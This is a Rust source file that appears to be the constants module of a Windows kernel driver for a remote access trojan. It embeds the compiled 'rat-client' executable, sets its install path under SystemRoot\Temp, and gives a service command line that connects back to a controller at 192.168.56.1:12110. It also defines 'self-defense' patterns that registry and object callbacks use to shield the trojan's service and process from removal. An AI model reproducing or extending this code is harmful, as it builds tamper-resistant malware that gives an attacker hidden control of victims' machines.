use core::ffi::c_void;
use core::ptr;
use core::sync::atomic::{AtomicBool, AtomicI64, AtomicPtr};

use aho_corasick::AhoCorasick;
use const_format::formatcp;
use rat_common::windows::RAT_CLIENT_SERVICE_NAME;
use wdk_sys::DRIVER_OBJECT;
use widestring::{U16CStr, u16cstr};

pub const MAX_INITIALIZE_ATTEMPTS: usize = 50;
pub const RAT_CLIENT_SERVICE_REGISTRY: &U16CStr = u16cstr!(formatcp!(
    "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\{RAT_CLIENT_SERVICE_NAME}"
));

/// Self-defense pattern to construct the Aho-Corasick automaton.
///
/// For self-defense, we may receive either `\CurrentControlSet\` or `\ControlSet001\` in the callback, so
/// we need to match any of them.
pub const RAT_CLIENT_SERVICE_REGISTRY_SELF_DEFENSE: &U16CStr =
    u16cstr!(formatcp!("\\Services\\{RAT_CLIENT_SERVICE_NAME}"));

/// Self-defense pattern to construct the Aho-Corasick automaton.
///
/// The object callback protects against handle creation of any process whose image path
/// matches this pattern.
pub const RAT_CLIENT_OBJ_PATH_SELF_DEFENSE: &U16CStr =
    u16cstr!(formatcp!("Temp\\{RAT_CLIENT_SERVICE_NAME}.exe"));

pub const RAT_CLIENT_OBJ_PATH: &U16CStr = u16cstr!(formatcp!(
    "\\SystemRoot\\Temp\\{RAT_CLIENT_SERVICE_NAME}.exe"
));
pub const RAT_CLIENT_SERVICE_PATH: &U16CStr = u16cstr!(formatcp!(
    "\"%SystemRoot%\\Temp\\{RAT_CLIENT_SERVICE_NAME}.exe\" --host 192.168.56.1:12110 --log-path \"%SystemRoot%\\System32\\violet.log\" --scm"
));

pub const ALTITUDE: &U16CStr = u16cstr!("360000");

pub const DOS_NAME: &U16CStr = u16cstr!(formatcp!("\\DosDevices\\{RAT_CLIENT_SERVICE_NAME}"));
pub const DEVICE_NAME: &U16CStr = u16cstr!(formatcp!("\\Device\\{RAT_CLIENT_SERVICE_NAME}"));

#[cfg(debug_assertions)]
pub const RAT_CLIENT: &[u8] = include_bytes!("../../target/debug/rat-client.exe");

#[cfg(not(debug_assertions))]
pub const RAT_CLIENT: &[u8] = include_bytes!("../../target/release/rat-client.exe");

pub static SELF_DEFENSE_ACTIVATED: AtomicBool = AtomicBool::new(false);

pub static OBJ_PATH_AHO_CORASICK: AtomicPtr<AhoCorasick> = AtomicPtr::new(ptr::null_mut());
pub static OB_REGISTER_CALLBACKS_HANDLE: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
pub static SERVICE_REGISTRY_AHO_CORASICK: AtomicPtr<AhoCorasick> = AtomicPtr::new(ptr::null_mut());
pub static CM_REGISTER_CALLBACK_COOKIE: AtomicI64 = AtomicI64::new(0);

pub static ORIGINAL_DRIVER_OBJECT: AtomicPtr<DRIVER_OBJECT> = AtomicPtr::new(ptr::null_mut());
